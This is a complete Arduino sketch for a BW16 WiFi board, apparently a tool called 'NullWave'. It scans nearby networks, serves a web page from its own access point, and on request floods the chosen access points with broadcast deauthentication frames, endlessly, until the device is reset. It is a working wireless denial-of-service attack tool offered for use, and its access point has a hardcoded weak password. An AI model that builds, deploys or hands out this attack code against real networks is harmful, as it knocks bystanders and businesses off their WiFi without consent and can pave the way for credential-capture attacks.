#include <Arduino.h>
#undef min
#undef max

#include <vector>
#include <map>
#include <WiFi.h>
#include <wifi_conf.h>
#include <wifi_util.h>
#include <wifi_structures.h>
#include <WiFiClient.h>
#include <WiFiServer.h>

#include "packet-injection.h"
#include "webui.h" // <-- Panggil file UI di sini

char *ssid = "NullWave_BW16";
char *pass = "12345678";

WiFiServer server(80);

std::vector<WiFiScanResult> scan_results;
std::vector<int> selected_targets;
bool isDeauthing = false;
int current_channel = 1;

// ==========================================
// FUNGSI SCAN
// ==========================================
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    
    if (scan_results.size() < 30) { 
      WiFiScanResult result;
      result.ssid = String((const char *)record->SSID.val);
      if (result.ssid.length() == 0) result.ssid = "[Hidden]";
      result.channel = record->channel;
      result.rssi = record->signal_strength;
      memcpy(&result.bssid, &record->BSSID.octet, 6);
      scan_results.push_back(result);
    }
  }
  return RTW_SUCCESS;
}

void scanNetworks() {
  scan_results.clear();
  wifi_scan_networks(scanResultHandler, NULL);
  delay(5000); 
}

// ==========================================
// PARSING POST DATA
// ==========================================
std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) return post_params;
    body_start += 4;
    String post_data = request.substring(body_start);
    int start = 0, end = post_data.indexOf('&', start);
    while (end != -1) {
        String kv = post_data.substring(start, end);
        int delimiter = kv.indexOf('=');
        if (delimiter != -1) post_params.push_back({kv.substring(0, delimiter), kv.substring(delimiter + 1)});
        start = end + 1;
        end = post_data.indexOf('&', start);
    }
    String kv = post_data.substring(start);
    int delimiter = kv.indexOf('=');
    if (delimiter != -1) post_params.push_back({kv.substring(0, delimiter), kv.substring(delimiter + 1)});
    return post_params;
}

// ==========================================
// SETUP & LOOP
// ==========================================
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  digitalWrite(LED_R, HIGH); 
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  scanNetworks();
  server.begin();
}

void loop() {
  // ==========================================
  // MODE FIRE & FORGET (WEB SERVER MATI TOTAL)
  // ==========================================
  if (isDeauthing) {
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_B, HIGH); // LED Biru nyala = Sedang Deauth
    
    for (int idx : selected_targets) {
      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
      uint8_t deauth_bssid[6];
      memcpy(deauth_bssid, scan_results[idx].bssid, 6);
      
      for(int f = 0; f < 100; f++) {
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
      }
    }
    return; // Fokus nembak, gak peduli Web Server!
  }

  // ==========================================
  // WEB SERVER (Normal Mode)
  // ==========================================
  WiFiClient client = server.available();
  if (client) {
    digitalWrite(LED_G, HIGH); 
    
    String request = "";
    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        request += c;
        if (request.endsWith("\r\n\r\n")) {
          if (request.startsWith("POST")) {
            unsigned long start = millis();
            while (millis() - start < 50) {
              if (client.available()) request += (char)client.read();
            }
          }
          break;
        }
      }
    }

    if (request.indexOf("GET / ") >= 0) {
      handleRoot(client, scan_results); // Panggil UI dari webui.h
    } 
    else if (request.indexOf("GET /scan") >= 0) {
      client.println("HTTP/1.1 302 Found\r\nLocation: /\r\nConnection: close\r\n\r\n");
      client.stop();
      scanNetworks();
    } 
    else if (request.indexOf("POST /deauth") >= 0) {
      client.println("HTTP/1.1 200 OK\r\nConnection: close\r\n\r\nATTACK LAUNCHED.");
      
      selected_targets.clear();
      std::vector<std::pair<String, String>> params = parsePost(request);
      for (auto &param : params) {
        if (param.first == "network") {
          selected_targets.push_back(String(param.second).toInt());
        }
      }
      
      if (selected_targets.size() > 0) {
        isDeauthing = true; 
      }
    } 
    else {
      client.println("HTTP/1.1 404 Not Found\r\nConnection: close\r\n");
    }
    
    client.stop();
    digitalWrite(LED_G, LOW);
  }
}